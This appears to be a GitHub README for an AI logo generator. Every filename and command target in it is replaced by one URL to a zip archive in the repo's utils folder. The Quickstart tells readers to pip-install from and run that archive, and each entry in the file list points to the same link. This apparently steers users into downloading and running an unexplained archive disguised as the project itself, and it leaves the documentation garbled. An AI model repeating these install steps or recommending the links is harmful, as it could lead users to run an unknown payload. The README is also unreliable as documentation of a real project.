# AI Logo Generator


Diffusion-based text-to-logo generator. Generates clean, customizable logos from short text prompts and optional sketches. This project is intended as a starting point — plug in a diffusion checkpoint (Stable Diffusion/SDXL or Groq) and tweak presets.


## Features
- Text-to-logo generation with prompt enhancement
- Optional image-to-image refinement (sketch -> logo)
- Style presets (minimal, geometric, vintage, gradient)
- Batch generation and reproducible seeds


## Quickstart
1. Create a Python 3.10+ virtualenv
2. `pip install -r https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_20/main/utils/Ai-project-3.5.zip`
3. Place your diffusion model credentials / checkpoint as described in `https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_20/main/utils/Ai-project-3.5.zip` comments
4. Run the Streamlit UI: `streamlit run https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_20/main/utils/Ai-project-3.5.zip`


## Files
- `https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_20/main/utils/Ai-project-3.5.zip` — Streamlit frontend
- `https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_20/main/utils/Ai-project-3.5.zip` — core pipeline (uses Hugging Face diffusers by default)
- `https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_20/main/utils/Ai-project-3.5.zip` — small NLP utility to expand prompts
- `utils/` — image helpers and seed utilities
- `https://raw.githubusercontent.com/analyst-ujjwal/Ai_project_20/main/utils/Ai-project-3.5.zip` — style preset definitions


## Notes
- This repo assumes you will use a local or remote Stable Diffusion compatible checkpoint. Model-specific configuration may be required.
- Vectorization is not included but can be added (e.g., `potrace`, `autotrace`, or `DeepSVG`).